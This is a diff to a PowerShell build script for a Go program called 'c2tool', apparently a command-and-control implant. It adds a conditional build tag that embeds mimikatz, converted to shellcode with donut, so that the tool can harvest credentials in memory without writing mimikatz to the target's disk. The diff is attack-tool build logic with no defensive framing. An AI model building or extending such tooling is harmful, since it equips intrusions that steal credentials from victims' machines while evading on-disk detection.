@@ -195,8 +195,24 @@ $env:CGO_ENABLED = '0'
 $env:GOFLAGS = '-mod=mod'
 
 # The embedserver tag swaps internal/embed/embed_dev.go for embed_release.go,
-# which is what actually carries the server payload.
-& go build -tags embedserver -trimpath -o $binPath ./cmd/c2tool
+# which is what actually carries the server payload. The mimikatzshellcode tag is
+# added only when the donut blob is on disk: the //go:embed directive for it fails
+# to compile otherwise, so an unconditional tag would make every build depend on
+# a tool the operator may not have.
+#
+# The blob is what makes the credential harvest run without writing mimikatz to
+# the target's disk, so it is worth generating — but its absence is a working
+# build, not a broken one.
+$buildTags = 'embedserver'
+$shellcodeBlob = Join-Path $PSScriptRoot '..\internal\embed\mimikatz\mimikatz.x64.bin'
+if (Test-Path $shellcodeBlob) {
+    $buildTags = "$buildTags,mimikatzshellcode"
+    Write-Host ("    in-memory harvest enabled (shellcode blob {0:N0} KB)" -f ((Get-Item $shellcodeBlob).Length / 1KB))
+} else {
+    Write-Host '    in-memory harvest disabled (no shellcode blob; run build/build-mimikatz-shellcode.ps1)'
+}
+
+& go build -tags $buildTags -trimpath -o $binPath ./cmd/c2tool
 if ($LASTEXITCODE -ne 0) { throw 'launcher build failed' }
 
 # --- 4. package --------------------------------------------------------------
